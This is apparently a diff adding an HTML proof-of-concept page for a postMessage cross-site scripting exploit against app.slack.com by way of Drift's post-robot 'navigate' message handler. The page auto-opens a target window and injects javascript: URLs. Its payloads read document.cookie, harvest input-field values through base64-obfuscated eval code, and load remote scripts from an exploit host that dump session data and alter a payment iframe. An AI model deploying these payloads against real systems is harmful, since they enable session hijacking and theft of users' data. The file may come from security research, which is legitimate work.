@@ -1,0 +1,154 @@
+<!--
+				-->
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<!-- -->
+<!-- -->
+<!-- -->
+<!-- -->
+<!-- -->
+<script></script>
+<script></script>
+<script></script>
+<script></script>
+<script></script>
+<script></script>
+<script></script>
+<script></script>
+<script></script>
+<script></script>
+</head>
+<body>		
+		<!-- -->
+		<!-- -->
+		<p style="font-weight:bold">postMessage XSS</p>
+		<p>1. A window should be automatically opened in ~5s. If popup is blocked, unblock popup and click 'Open Window' 
+			<span>
+				<!--
+								-->
+				
+			</span>
+			<input type="button" value="Open Window" onclick="open_window();"> 
+		</p>
+		<p>2. Wait for the page to finish loading, you should then see the XSS alert popup<span><span></span></span></p>
+		<p>
+			<span>.<span>
+			<span>
+
+				
+				<!--  -->
+				<iframe style="display:none;"></iframe>
+				
+				<!--  -->
+
+			</span>
+		</span></span></p>
+		<br>
+		<br>
+		<!-- -->
+
+		<div style="display:none">
+			<p>Select a URL to open:</p>
+			<select id="open_url">
+			<option value="https://app.slack.com/" selected="selected">https://app.slack.com/</option></select>
+			<p>Select a Payload to execute</p>
+			<select id="selected_payload">
+				<option value="alert_cookie" selected="selected">alert(document.cookie)</option>
+			</select>
+					
+			<input type="button" value="Execute XSS" onclick="execute_xss();">
+			<br>
+		</div>
+		
+		<!-- -->
+
+		<iframe id="vulnframe" style="display:none; width:0px; height:0px;" src="app.slack.com%20c003c32f71f170ebf9c05a02c193c1c3_files/app.html"></iframe>
+<!-- -->
+
+		<script>
+		var urls = [
+			"https://app.slack.com/"
+		];
+
+		var open_url_elm = document.getElementById("open_url");
+		for(var i=0;i < urls.length;i++) {
+			var option = document.createElement("option");
+			option.setAttribute("value", urls[i]);
+			option.innerText = urls[i];
+			
+			open_url_elm.appendChild(option);
+		}
+		
+		window.addEventListener("message", function(e) {
+			if(typeof e.data==='string' && e.data === 'souxj') {
+				clearInterval(window['owi']);
+			}
+			if(typeof e.data==='string' && e.data.startsWith('sourw')) {
+				win = window.open(e.data.replace('sourw|',''));
+			}
+		});
+		var target = null;
+		var sent_pm_already = false; // has sent initializing postmessage?
+		
+		var jumperframe = null;
+		
+		function sleep(ms) {
+			return new Promise(resolve => setTimeout(resolve, ms));
+		}
+		
+		function jumperinitt() {
+			//
+		}
+		
+		function open_window() {
+			var url = document.getElementById("open_url").value || "";
+			win.postMessage("sourw|" + url, '*');
+		}
+		
+		function execute_xss() {
+			
+			var command = document.getElementById("selected_payload").value;
+			var t = Date.now();
+			var payload = "";
+	
+			if( command === 'alert_cookie' ) {
+				payload = 'javascript:alert(document.cookie);';
+			}
+			if( command === 'input_fields' ) {
+				//payload = `javascript:var niraeth_input_data = {}; document.querySelectorAll("input").forEach(function(element) {niraeth_input_data[element.name] = element.value;}); console.log("NIRAETH input data:"); console.log(niraeth_input_data); alert('check your console.log for the input data');`;
+				// if above payload doesn't work,
+				payload = "javascript:eval(atob(`dmFyIG5pcmFldGhfaW5wdXRfZGF0YSA9IHt9OyBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCJpbnB1dCIpLmZvckVhY2goZnVuY3Rpb24oZWxlbWVudCkge25pcmFldGhfaW5wdXRfZGF0YVtlbGVtZW50Lm5hbWVdID0gZWxlbWVudC52YWx1ZTt9KTsgY29uc29sZS5sb2coIk5JUkFFVEggaW5wdXQgZGF0YToiKTsgY29uc29sZS5sb2cobmlyYWV0aF9pbnB1dF9kYXRhKTsgYWxlcnQoJ2NoZWNrIHlvdXIgY29uc29sZS5sb2cgZm9yIHRoZSBpbnB1dCBkYXRhJyk7`));";
+			}
+			if( command === 'input_parent_fields' ) {
+				//payload = `javascript:var niraeth_input_data = {}; window.parent.document.querySelectorAll("input").forEach(function(element) {niraeth_input_data[element.name] = element.value;}); console.log("NIRAETH input data:"); console.log(niraeth_input_data); alert('check your console.log for the input data');`;
+				payload = "javascript:eval(atob(`amF2YXNjcmlwdDp2YXIgbmlyYWV0aF9pbnB1dF9kYXRhID0ge307IHdpbmRvdy5wYXJlbnQuZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgiaW5wdXQiKS5mb3JFYWNoKGZ1bmN0aW9uKGVsZW1lbnQpIHtuaXJhZXRoX2lucHV0X2RhdGFbZWxlbWVudC5uYW1lXSA9IGVsZW1lbnQudmFsdWU7fSk7IGNvbnNvbGUubG9nKCJOSVJBRVRIIGlucHV0IGRhdGE6Iik7IGNvbnNvbGUubG9nKG5pcmFldGhfaW5wdXRfZGF0YSk7IGFsZXJ0KCdjaGVjayB5b3VyIGNvbnNvbGUubG9nIGZvciB0aGUgaW5wdXQgZGF0YScpOw=='));";
+			}
+			
+			if( command === 'dump_session_as_code' ) {
+				payload = `javascript:var scr=document.createElement('script'); scr.src='https://exploits.niraeth.com/scripts/copy_session_as_code.js?t=${t}'; document.head.appendChild(scr); alert('copy_session_as_code.js loaded')`;				
+			}
+			if( command === 'change_ayden_iframe_src' ) {
+				payload = `javascript:var scr=document.createElement('script'); scr.src='https://exploits.niraeth.com/scripts/change_ayden_iframe_src.js?t=${t}'; document.head.appendChild(scr); alert('change_ayden_iframe_src.js loaded')`;
+			}
+			if( payload === '' ) {
+				alert("Invalid payload");
+				return;
+			}					
+			
+			//payload = "javascript:alert(1)";
+			//alert("sending payload: " + payload);
+			window.postMessage(JSON.stringify({ "__post_robot_10_0_16__" : {id: new Date().getTime(), type:"postrobot_message_request", sourceDomain:"",origin: "https://js.driftt.com", name: "navigate", data:{url:"${payload}" } }} ), '*');
+		}
+		window['owi'] = setInterval(open_window, 4444);
+		
+		
+		</script>
+
+
+
+
+
+
+
+
+</body></html>
